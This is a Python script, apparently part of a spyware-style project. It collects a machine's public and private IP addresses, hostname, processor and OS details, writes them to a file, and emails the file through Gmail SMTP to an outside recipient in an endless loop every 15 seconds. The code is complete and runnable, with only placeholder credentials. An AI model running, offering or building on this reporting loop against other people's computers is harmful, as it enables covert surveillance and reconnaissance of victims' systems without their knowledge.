import socket
import platform
from requests import get
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time

def computer_information(file_path, extend, system_information):
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def send_email(sender_email, sender_password, recipient_email, subject, body, attachment_path=None):
    try:
        # Set up the SMTP server
        smtp_server = smtplib.SMTP("smtp.gmail.com", 587)  # Replace with your SMTP server and port
        smtp_server.starttls()
        smtp_server.login(sender_email, sender_password)

        # Create the email message
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recipient_email
        message["Subject"] = subject
        message.attach(MIMEText(body, "plain"))

        # Attach the file if specified
        if attachment_path:
            with open(attachment_path, "rb") as attachment_file:
                part = MIMEApplication(attachment_file.read(), Name=attachment_path)
                part["Content-Disposition"] = f'attachment; filename="{attachment_path}"'
                message.attach(part)

        # Send the email
        smtp_server.sendmail(sender_email, recipient_email, message.as_string())

        # Close the SMTP server
        smtp_server.quit()
        print("Email sent successfully!")

    except Exception as e:
        print(f"An error occurred while sending the email: {str(e)}")

def computer_information_and_send_email(file_path, extend, system_information, sender_email, sender_password, recipient_email):
    while True:
        computer_information(file_path, extend, system_information)

        with open(file_path + extend + system_information, "r") as f:
            email_subject = "System Information Report"
            email_body = f.read()

        send_email(sender_email, sender_password, recipient_email, email_subject, email_body, file_path + extend + system_information)
        
        # Wait for 15 seconds before sending the next email
        time.sleep(15)

# Example usage:
file_path = "computerinfo\\"
extend = "computer_info"
system_information = ".txt"
sender_email = "sender email id"  
sender_password = "sender password"    
recipient_email = "recipient email id"  
computer_information_and_send_email(file_path, extend, system_information, sender_email, sender_password, recipient_email)
